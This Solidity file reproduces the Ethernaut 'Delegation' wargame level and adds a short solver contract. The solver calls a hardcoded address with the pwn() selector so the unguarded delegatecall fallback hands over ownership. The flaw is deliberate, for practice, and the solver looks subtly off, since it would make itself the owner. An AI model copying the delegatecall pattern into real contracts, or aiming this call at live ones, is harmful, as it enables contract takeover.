// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract ehternautDelegation {
    function solve() external {
        address delegationAddr = 0x8739cC1b2D35Afe02b6481D03db72AeAe2510E4f;
        delegationAddr.call(abi.encode(bytes4(keccak256("pwn()"))));
    }
}